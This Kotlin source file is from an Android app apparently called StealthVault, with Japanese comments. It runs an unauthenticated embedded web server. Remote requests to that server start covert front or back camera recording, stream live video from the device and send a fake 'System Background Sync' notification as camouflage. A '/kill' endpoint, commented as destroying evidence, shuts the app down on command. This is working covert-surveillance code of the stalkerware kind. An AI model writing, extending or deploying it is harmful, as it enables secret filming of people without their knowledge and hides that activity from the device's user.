package com.stealth.evidence.ui

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.camera.core.CameraSelector
import androidx.core.app.NotificationCompat
import io.ktor.http.ContentType
import io.ktor.server.application.call
import io.ktor.server.engine.embeddedServer
import io.ktor.server.netty.Netty
import io.ktor.server.netty.NettyApplicationEngine
import io.ktor.server.response.header
import io.ktor.server.response.respondOutputStream
import io.ktor.server.response.respondText
import io.ktor.server.routing.get
import io.ktor.server.routing.routing
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class EmbeddedServer(private val appContext: Context) {
    private var server: NettyApplicationEngine? = null

    fun start() {
        CoroutineScope(Dispatchers.IO).launch {
            server = embeddedServer(Netty, port = 8080) {
                routing {
                    // サーバー稼働確認用
                    get("/") {
                        call.respondText("StealthVault Server is running")
                    }
                    
                    // 遠隔：録画開始（カメラ向きの指定対応）
                    get("/start") {
                        val facingParam = call.parameters["facing"]
                        val lensFacing = if (facingParam == "front") {
                            CameraSelector.LENS_FACING_FRONT
                        } else {
                            CameraSelector.LENS_FACING_BACK
                        }

                        val intent = Intent(appContext, StealthCameraService::class.java).apply {
                            putExtra("EXTRA_CAMERA_FACING", lensFacing)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            appContext.startForegroundService(intent)
                        } else {
                            appContext.startService(intent)
                        }
                        call.respondText("Recording started (facing: $facingParam)")
                    }
                    
                    // 遠隔：録画停止
                    get("/stop") {
                        val intent = Intent(appContext, StealthCameraService::class.java)
                        appContext.stopService(intent)
                        call.respondText("Recording stopped via remote")
                    }

                    // 遠隔：カモフラージュ通知送信
                    get("/notify") {
                        sendCamouflageNotification()
                        call.respondText("Camouflage notification sent")
                    }

                    // 遠隔：アプリ強制キル（証拠隠滅）
                    get("/kill") {
                        call.respondText("Executing Kill Switch...")
                        Thread.sleep(500)
                        exitProcess(0)
                    }

                    // 追加：映像ストリーミング（MJPEG配信）
                    get("/stream") {
                        call.response.header("Cache-Control", "no-cache")
                        call.respondOutputStream(ContentType.parse("multipart/x-mixed-replace; boundary=--myboundary")) {
                            try {
                                while (true) {
                                    val jpeg = StealthCameraService.latestJpeg
                                    if (jpeg != null) {
                                        write("--myboundary\r\n".toByteArray())
                                        write("Content-Type: image/jpeg\r\n".toByteArray())
                                        write("Content-Length: ${jpeg.size}\r\n\r\n".toByteArray())
                                        write(jpeg)
                                        write("\r\n".toByteArray())
                                        flush()
                                    }
                                    // 約10fpsで配信（ネットワーク負荷を抑える）
                                    Thread.sleep(100)
                                }
                            } catch (e: Exception) {
                                // クライアント側（ブラウザやアプリ）が切断した場合はループを抜けて終了
                            }
                        }
                    }
                }
            }
            server?.start(wait = true)
        }
    }

    private fun sendCamouflageNotification() {
        val channelId = "camouflage_channel"
        val notificationManager = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Background Sync",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(appContext, channelId)
            .setContentTitle("システム同期")
            .setContentText("同期を開始しました (バックグラウンド処理中)")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(999, notification)
    }

    fun stop() {
        server?.stop(1000, 2000)
    }
}
